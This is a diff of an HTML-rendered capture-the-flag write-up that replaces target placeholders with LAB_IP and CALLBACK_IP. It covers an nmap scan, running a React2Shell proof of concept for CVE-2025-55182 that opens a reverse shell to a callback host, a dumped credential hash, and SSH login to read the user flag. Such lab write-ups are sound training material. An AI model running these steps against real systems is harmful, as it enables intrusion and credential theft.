@@ -3465,7 +3465,7 @@
 </ol>
 <h2 id="1-reconnaissance">1. Reconnaissance<a class="headerlink" href="#1-reconnaissance" title="Permanent link">&para;</a></h2>
 <p>The completed scan found SSH and the web application:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-T4<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>nmap/nmap_full_scan<span class="w"> </span>&lt;TARGET_IP&gt;
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-T4<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>nmap/nmap_full_scan<span class="w"> </span>LAB_IP
 </span></code></pre></div>
 <table>
 <thead>
@@ -3502,8 +3502,8 @@
 <h2 id="2-exploit-react2shell">2. Exploit React2Shell<a class="headerlink" href="#2-exploit-react2shell" title="Permanent link">&para;</a></h2>
 <p>The source notes use a React2Shell proof of concept for CVE-2025-55182. Replace the target and callback values with the values from the active lab session:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>python3<span class="w"> </span>react2shell.py<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span>-u<span class="w"> </span>http://&lt;TARGET_IP&gt;:3000/<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>-l<span class="w"> </span>&lt;LHOST&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span>-u<span class="w"> </span>http://LAB_IP:3000/<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span>-l<span class="w"> </span>CALLBACK_IP<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">  </span>-p<span class="w"> </span><span class="m">4444</span>
 </span></code></pre></div>
 <p>The payload creates a FIFO-backed reverse shell. Catch the connection and stabilize it:</p>
@@ -3525,7 +3525,7 @@
 </span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="m">2</span><span class="p">|</span>engineer<span class="p">|</span>39d97110eafe2a9a68639812cd271e8e<span class="p">|</span>operator<span class="p">|</span>engineer@reactor.htb
 </span></code></pre></div>
 <p>The recovered engineer credentials allow SSH access:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh<span class="w"> </span>engineer@&lt;TARGET_IP&gt;
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ssh<span class="w"> </span>engineer@LAB_IP
 </span></code></pre></div>
 <p>The user flag was read from the engineer home directory. The value is redacted in this public writeup:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>engineer@reactor:~$<span class="w"> </span>cat<span class="w"> </span>user.txt
